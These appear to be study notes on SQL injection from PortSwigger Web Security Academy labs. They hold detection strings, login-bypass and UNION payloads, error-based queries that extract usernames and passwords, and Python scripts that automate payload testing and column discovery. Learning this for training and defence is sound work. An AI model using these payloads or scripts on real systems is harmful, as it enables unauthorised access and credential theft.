# PortSwingger WebSecurity Academy

## SQL injection

### Define
SQL injection is web security vulnerability that allow an attacker to interfere with the queries that an application make it to databases.

This can allow an attacker to view data that not able to retrive including data belongings to other person, or other data that application can be access. 

### Detect SQLi

When a site appears to be vulnerable to SQL injection (SQLi) due to unusual server responses to SQLi-related inputs, the first step is to understand how to inject data into the query without disrupting it. This requires identifying the method to escape from the current context effectively. 

```
'
"
`
')
")
`)
'))
"))
`))
OR 1=1
OR 1=2
```

After confirming the site are vulnerable, try to put comment.

```
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/
```

### Retreive Hidden Data

`https://insecure-website.com/products?category=Gifts`

This website try to display product in different categories. The SQL query to retrieve details look like.

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1 `

>The restriction `released = 1` is being used to hide products that are not released. We could assume for unreleased products, `released = 0`. 

#### The payload

Since the query doesnt implement any defense againts SQL injection, the attacker can craft a payload such as : 

```
https://insecure-website.com/products?category=Gifts'-- 

https://insecure-website.com/products?category=Gifts'+OR+1=1--

```
> + symbol represent space in url.

##### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> Given the website with search funtion.

`https://URL/filter?category=Pets%27+OR+1=1--`

`https://URL/filter?category=Pets'+--`

```
import requests
from bs4 import BeautifulSoup

url = "https://URL/filter?category="

payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' AND 1=CONVERT(int, (SELECT @@version)) --",
    "' UNION SELECT null, null, null --",
    "' UNION SELECT null, table_name, null FROM information_schema.tables --",
    "' AND 1=0 UNION ALL SELECT null, null, null --"
]

def test_sql_injection(url, payloads):
    for payload in payloads:
        test_url = url + payload
        
        try:
            response = requests.get(test_url)
            
            print(f"Testing payload: {payload}")
            print(f"Status Code: {response.status_code}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            print(f"HTML Content (first 500 chars): {soup.prettify()[:500]}")
            print("-" * 40)
        
        except requests.RequestException as e:
            print(f"An error occurred: {e}")

test_sql_injection(url, payloads)

```


### Subverting Application Logic

Application that have login and when user submit the application check the credentials by performing SQL query.

`SELECT * FROM users WHERE username = 'whyme' AND password = 'superstrong'`

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected. In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence `--` to remove the password check from the **WHERE** clause of the query. For example, submitting the username `administrator'-- `and a blank password results in the following query: 

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

SQLi Logic 

```
true
1
1>0
2-1
0+1
1*1
1%2
1 & 1
1&1
1 && 2
1&&2
-1 || 1
-1||1
-1 oR 1=1
1 aND 1=1
(1)oR(1=1)
(1)aND(1=1)
-1/**/oR/**/1=1
1/**/aND/**/1=1
1'
1'>'0
2'-'1
0'+'1
1'*'1
1'%'2
1'&'1'='1
1'&&'2'='1
-1'||'1'='1
-1'oR'1'='1
1'aND'1'='1
1"
1">"0
2"-"1
0"+"1
1"*"1
1"%"2
1"&"1"="1
1"&&"2"="1
-1"||"1"="1
-1"oR"1"="1
1"aND"1"="1
1`
1`>`0
2`-`1
0`+`1
1`*`1
1`%`2
1`&`1`=`1
1`&&`2`=`1
-1`||`1`=`1
-1`oR`1`=`1
1`aND`1`=`1
1')>('0
2')-('1
0')+('1
1')*('1
1')%('2
1')&'1'=('1
1')&&'1'=('1
-1')||'1'=('1
-1')oR'1'=('1
1')aND'1'=('1
1")>("0
2")-("1
0")+("1
1")*("1
1")%("2
1")&"1"=("1
1")&&"1"=("1
-1")||"1"=("1
-1")oR"1"=("1
1")aND"1"=("1
1`)>(`0
2`)-(`1
0`)+(`1
1`)*(`1
1`)%(`2
1`)&`1`=(`1
1`)&&`1`=(`1
-1`)||`1`=(`1
-1`)oR`1`=(`1
1`)aND`1`=(`1

```

### SQL injection UNION attacks

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the **UNION** keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection **UNION** attack.

The **UNION** keyword enables you to execute one or more additional **SELECT** queries and append the results to the original query. For example:
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

This SQL query returns a single result set with two columns, containing values from columns `a` and `b` in `table1` and `columns c` and `d` in `table2`. 

### 1. Determine number of column

Increase number using `ORDER BY 1 --` to find number of column

Can also use `' UNION SELECT NULL,NULL,NULL --`

> null represent number of column. can be increase

#### SQL injection UNION attack, determining the number of columns returned by the query

```
GET /filter?category=Gifts HTTP/2

> Determine number of column using ORDER BY 3 --
>> Using UNION SELECT null,null,null -- 
```

### 2. Finding column with usefull data
The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data. 

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

>>Favroutire
' UNION SELECT 'a','bb','ccc','dddd'--

```

### Database Specific

```
Oracle 	
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

Microsoft 
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

PostgreSQL 
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

MySQL 
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
Full Exploit

```
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    path = "filter?category=Gifts"
    for i in range(1,50):
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

def exploit_sqli_string_field(url, num_col):
    path = "filter?category=Gifts"
    for i in range(1, num_col+1):
        string = "'v2F6UA'"
        payload_list = ['null'] * num_col
        payload_list[i-1] = string
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
        print("[+] Figuring out which column contains text...")
        string_column = exploit_sqli_string_field(url, num_col)
        if string_column:
            print("[+] The column that contains text is " + str(string_column) + ".")
        else:
            print("[-] We were not able to find a column that has a string data type.")
    else:
        print("[-] The SQLi attack was not successful.")

```

Multiple values
`' UNION SELECT NULL,username || '~' || password FROM users--`


## Blind SQLi

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized TrackingId, the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition. 

`?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'`


### Error-Based SQL Injection

```
' AND CAST((SELECT 1) AS int)--
' AND 1=CAST((SELECT username FROM users) AS int)--
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
